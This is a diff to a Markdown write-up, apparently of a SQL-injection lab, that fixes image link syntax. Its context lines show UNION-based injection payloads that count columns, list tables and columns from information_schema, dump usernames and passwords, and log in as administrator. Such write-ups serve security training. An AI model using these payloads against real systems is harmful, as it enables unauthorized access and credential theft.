@@ -22,7 +22,7 @@ Payload: `' ORDER BY N-- -`
 
 Payload: `' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables-- -`
 
-!(fig1.png)[fig1.png]
+![fig1.png](fig1.png)
 
 Среди прочего находим интересующую нас таблицу: `users_zpeieo`
 
@@ -30,15 +30,15 @@ Payload: `' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables-- -`
 
 Payload: `' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'users_zpeieo'-- -`
 
-!(fig2.png)[fig2.png]
+![fig2.png](fig2.png)
 
 ## Step 4. Get username and password
 
 Payload: `' UNION SELECT username_hznyde, password_eijuyu FROM users_zpeieo-- -`
 
-!(fig3.png)[fig3.png]
+![fig3.png](fig3.png)
 
 ## Step 5. Log in as `administrator`
 
-!(fig4.png)[fig4.png]
+![fig4.png](fig4.png)
 
